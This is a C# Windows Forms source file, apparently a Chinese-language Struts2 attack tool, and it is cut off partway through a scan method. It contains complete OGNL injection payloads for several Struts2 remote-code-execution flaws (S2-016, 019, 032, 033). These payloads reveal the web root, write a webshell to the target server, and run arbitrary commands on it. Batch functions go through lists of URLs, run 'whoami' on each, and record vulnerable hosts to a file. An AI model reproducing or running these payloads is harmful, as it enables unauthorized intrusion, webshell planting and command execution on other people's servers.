using http;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace Struts2
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public int usertime = 0;
        public string base64Decode(string str)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(str));
        }
        private void BtnUrlPaste_Click(object sender, EventArgs e)
        {
            IDataObject iData = Clipboard.GetDataObject();
            if (iData.GetDataPresent(DataFormats.Text))
            {
                TxtUrl.Text = (String)iData.GetData(DataFormats.Text);
                TxtInfo.Text = "";
                TxtLog.Text = "";
            }
        }

        private void BtnUrlCopy_Click(object sender, EventArgs e)
        {
            if (TxtUrl.Text != "")
            {
                Clipboard.SetDataObject(TxtUrl.Text);
                MessageBox.Show("URL已复制！");
            }
        }
        private void BtnStart_Click(object sender, EventArgs e)
        {
            if (this.TxtUrl.Text.Length < 1)
            {
                MessageBox.Show("请输入Struts2的URL地址，形如：http://www.xxx.com/xxx.action");
            }
            new Thread(new ThreadStart(this.getInfo)).Start();
        }
        public int flags = 0;
        public void loginfo(string log)
        {
            this.TxtLog.AppendText(string.Concat(new object[] { log, "----", DateTime.Now, "\n\n" }));
        }
        public void getInfo()
        {
            this.loginfo("正在获取Web信息，请稍等片刻........");
            string data = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
            ServerInfo info = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "");
            if (this.Radb019.Checked)
            {
                data = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()";
            }
            else if (this.Radb032.Checked)
            {
                data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a";
                info = HTTP.getResponse("get", this.TxtUrl.Text, 30, data, "");
            }
            else if (this.Radb033.Checked)
            {
                data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908";
                info = HTTP.getResponse("get",this.TxtUrl.Text, 30, data,"");
            }
            this.TxtInfo.Text = info.body;
            if (info.body.IndexOf("webpath:") != -1)
            {
                flags = 1 ;
                if (this.Radb019.Checked)
                {
                    MessageBox.Show("该目标存在Struts2远程代码执行漏洞-编号St2-019");
                    this.loginfo("验证结果：该目标存在Struts2远程代码执行漏洞-编号St2-019");
                }
                else if (this.Radb032.Checked)
                {
                    MessageBox.Show("存在Struts2远程代码执行漏洞-编号St2-032");
                    this.loginfo("验证结果：该目标存在Struts2远程代码执行漏洞-编号St2-032");
                }
                else if (this.Radb033.Checked)
                {
                    MessageBox.Show("存在Struts2远程代码执行漏洞-编号St2-033");
                    this.loginfo("验证结果：该目标存在Struts2远程代码执行漏洞-编号St2-033");
                }
                else
                {
                    MessageBox.Show("存在Struts2远程代码执行漏洞-编号St2-016");
                    this.loginfo("验证结果：该目标存在Struts2远程代码执行漏洞-编号St2-016");
                }
            }
            this.loginfo("获取Web信息完毕......");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.getShell)).Start();
        }
        public void getShell()
        {
            this.loginfo("正在准备上传文件中，请稍等片刻........");
            string text = this.TxtName.Text;
            string str2 = this.TxtPath.Text;
            string str3 = HttpUtility.UrlEncode(this.TxtShellContent.Text, Encoding.UTF8);
            string data = "redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22" + text + "%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=" + str3;
            string body = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "").body;
            if (this.Radb019.Checked)
            {
                data = "debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22" + text + "%22)).append(%23req.getParameter(%22shell%22)).close()&shell=" + str3;
            }
            else if (this.Radb032.Checked)
            {
                string[] textArray1 = new string[] { "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=", text, "&shellContent=", str3, "&encoding=UTF-8&pp=%2f&info1=oko&info2=kok" };
                data = string.Concat(textArray1);
                body = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "").body;
            }
            else if(this.Radb033.Checked)
            {
                string[] textArray11 = new string[] { "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),%23parameters.command[0].toString.json?&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=", text, "&content=", str3 };
                data = string.Concat(textArray11);
                body = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "").body;
            }
            if (!"如：/var/www/html/happy.jsp".Equals(str2) && !"".Equals(str2))
            {
                data = "redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22" + this.TxtPath.Text + "%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=" + str3;
                if (this.Radb019.Checked)
                {
                    data = "debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22" + this.TxtPath.Text + "%22)).append(%23req.getParameter(%22shell%22)).close()&shell=" + str3;
                }
                else if (this.Radb032.Checked)
                {
                    string[] textArray2 = new string[] { "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=", this.TxtPath.Text, "&shellContent=", str3, "&encoding=UTF-8&pp=%2f&info1=oko&info2=kok" };
                    data = string.Concat(textArray2);
                    body = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "").body;
                }
                else if (this.Radb033.Checked)
                {
                    string[] textArray21 = new string[] { "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),%23parameters.command[0].toString.json?&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=", this.TxtPath.Text, "&content=", str3 };
                    data = string.Concat(textArray21);
                    body = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "").body;
                }
            }
           
            string str6 = "上传文件失败";
            if (body.IndexOf("okokok") != -1)
            {
                str6 = "上传文件成功,请手工访问验证";
            }
            this.loginfo(str6 + "........");
            MessageBox.Show(str6 + this.TxtName.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.executeCmd)).Start();
        }
        public void executeCmd()
        {
            string text = this.TxtCmd.Text;
            if (text.Equals(""))
            {
                this.loginfo("请输入命令........");
            }
            else
            {
                this.loginfo("正在执行命令中，请稍等片刻........");
                string str2 = Uri.EscapeDataString(text);
                string data = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + str2 + @"%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                ServerInfo info = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "");
                if (this.Radb019.Checked)
                {
                    data = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + str2 + @"%27)).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                }
                else if (this.Radb032.Checked)
                {
                    data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + str2 + @"&pp=\\AAAA&ppp=%20&encoding=UTF-8";
                   info = HTTP.getResponse("get", this.TxtUrl.Text, 30, data, "");
                }
                else if (this.Radb033.Checked)
                {
                    data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=&command=whoami" + str2 + @"&encoding=UTF-8";
                    info = HTTP.getResponse("get", this.TxtUrl.Text, 30, data, "");
                }
               
                if ((info != null) && !string.IsNullOrEmpty(info.body))
                {
                    this.TxtCmdResult.Text = info.body.Replace("\n", "\r\n");
                }
                this.loginfo("命令执行完毕........");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (flags == 1)
            {
                new Thread(new ParameterizedThreadStart(this.executeBatchCmd)).Start(this.TxtUrl.Text);
            }
            else
                MessageBox.Show("命令执行失败！请检测漏洞是否存在！");
        }
        public void executeBatchCmd(object url)
        {
            this.loginfo("正在批量执行命令中，请稍等片刻........");
            foreach (string str in this.bt_list_cmds)
            {
                this.loginfo("正在批量执行[" + str + "]，请稍等片刻........");
                string str2 = Uri.EscapeDataString(str);
                string data = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + str2 + @"%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                ServerInfo info = HTTP.getResponse("post", this.TxtUrl.Text, 30, data, "");
                if (this.Radb019.Checked)
                {
                    data = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + str2 + @"%27)).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                }
                else if (this.Radb032.Checked)
                {
                    data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + str2 + @"&pp=\\A&ppp=%20&encoding=UTF-8";
                    info = HTTP.getResponse("get", this.TxtUrl.Text, 30, data, "");
                }
                else if (this.Radb033.Checked)
                {
                    data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + str2 + @"&pp=\\A&ppp=%20&encoding=UTF-8";
                    info = HTTP.getResponse("get", this.TxtUrl.Text, 30, data, "");
                }
                this.TxtCmdResult.AppendText(info.body);
                this.loginfo("执行[" + str + "]完毕........");
            }
            this.loginfo("批量命令执行完毕........");
        }
        public List<string> bt_list_cmds;

       
        public bool bt_end = false;
        public int bt_ok = 0;
        public int bt_sucess = 0;
        public int bt_sum = 0;
        public List<Thread> list_th = new List<Thread>();
        public List<string> bt_list_url = new List<string>();
        public List<string> bt_list_url_sucess = new List<string>();
        private Thread c_th;
        public int bt_thread_size = 10;

        public string getHtml(string url, string data, string htmlEncode)
        {
            try
            {
                Uri requestUri = new Uri(url);
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(requestUri);
                request.UserAgent = "Mozilla/5.0";
                request.Accept = "*/*";
                request.Method = "POST";
                request.Timeout = 0x9c40;
                request.KeepAlive = true;
                request.AllowAutoRedirect = true;
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Cookie", "");
                byte[] bytes = Encoding.UTF8.GetBytes(data);
                request.ContentLength = bytes.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(bytes, 0, bytes.Length);
                requestStream.Close();
                StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream(), Encoding.GetEncoding(htmlEncode));
                return reader.ReadToEnd().Replace("\n", "\r\n");
            }
            catch (Exception exception)
            {
                this.loginfo(exception.Message);
            }
            return "";
        }
        public static string getHtmlByPost(string url, string data)
        {
            HttpWebResponse response = null;
            StreamReader reader = null;
            HttpWebRequest request = null;
            string str = "";
            try
            {
                Uri requestUri = new Uri(url);
                request = (HttpWebRequest)WebRequest.Create(requestUri);
                request.Accept = "*/*";
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Timeout = 0xea60;
                request.AllowAutoRedirect = false;
                byte[] bytes = Encoding.ASCII.GetBytes(data);
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(bytes, 0, bytes.Length);
                requestStream.Close();
                response = (HttpWebResponse)request.GetResponse();
                str = new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            catch (Exception)
            {
            }
            finally
            {
                if (reader != null)
                {
                    reader.Close();
                }
                if (response != null)
                {
                    response.Close();
                }
                if (request != null)
                {
                    request.Abort();
                }
            }
            return str;
        }

        public void batchGetShell(object url)
        {
            string str = Convert.ToString(url);
            this.loginfo("正在验证....");
            string data = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
            if (this.Radb019.Checked)
            {
                data = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()";
            }
            else if (this.Radb032.Checked)
            {
                data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a";
            }
            else if (this.Radb033.Checked)
            {
                data = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),%23parameters.command[0].toString.json?&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse";
            }
            string str3 = this.getHtml(str, data, "UTF-8");
            ListViewItem item = new ListViewItem(str);
            if (str3.IndexOf("webpath:") != -1)
            {
                item.SubItems.Add("存在");
                if (this.Radb019.Checked)
                {
                    this.loginfo("验证结果：存在Struts2远程代码执行漏洞-编号St2-019");
                }
                else if (this.Radb032.Checked)
                {
                    this.loginfo("验证结果：存在Struts2远程代码执行漏洞-编号St2-032");
                }
                else
                {
                    this.loginfo("验证结果：存在Struts2远程代码执行漏洞-编号St2-016");
                }
                this.bt_ok++;
                string strpath = "null";
                string data2 = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                ServerInfo info1 = HTTP.getResponse("post", str, 30, data2, "");
                if (this.Radb019.Checked)
                {
                    data2 = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()";
                }
                else if (this.Radb032.Checked)
                {
                    data2 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a";
                    info1 = HTTP.getResponse("get", str, 30, data2, "");
                }
                if (info1.body.IndexOf("webpath:") != -1)
                {
                    strpath = info1.body;
                }
                item.SubItems.Add(strpath);
                string strcmd = "whoami";
                string strinfo = "执行失败!";
                string data1 = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + strcmd + @"%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                ServerInfo info = HTTP.getResponse("post", str, 30, data1, "");
                if (this.Radb019.Checked)
                {
                    data1 = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27" + strcmd + @"%27)).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
                }
                else if (this.Radb032.Checked)
                {
                    data1 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + strcmd + @"&pp=\\AAAA&ppp=%20&encoding=UTF-8";
                   info = HTTP.getResponse("get", str, 30, data1, "");
                }
                else if (this.Radb033.Checked)
                {
                    data1 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=&command="+ strcmd;
                    info = HTTP.getResponse("get", str, 30, data1, "");
                }
                if ((info != null) && !string.IsNullOrEmpty(info.body))
                {
                    strinfo = info.body.Replace("\n", "\r\n");
                    
                }
            item.SubItems.Add(strinfo);
            object[] args = new object[] { item };
            base.Invoke(new addItem(this.addItemToList), args);
            if (!File.Exists(System.Windows.Forms.Application.StartupPath + "/happy.txt"))
            {
                FileStream stream = new FileStream(System.Windows.Forms.Application.StartupPath + "/happy.txt", FileMode.Create, FileAccess.Write);
                StreamWriter writer = new StreamWriter(stream);
                writer.WriteLine(str);
                writer.Close();
                stream.Close();
               
            }
                else{
                    FileStream fs = new FileStream(System.Windows.Forms.Application.StartupPath + "/happy.txt", FileMode.Append, FileAccess.Write);
StreamWriter sr = new StreamWriter(fs);
sr.WriteLine(str);
sr.Close();
fs.Close();}
                
            }
        }
        private delegate void addItem(ListViewItem lvi);
        public void addItemToList(ListViewItem lvi)
        {
            this.bt_lvw.Items.Add(lvi);
        }

 

        public void scan()
        {
            while (true)
            {
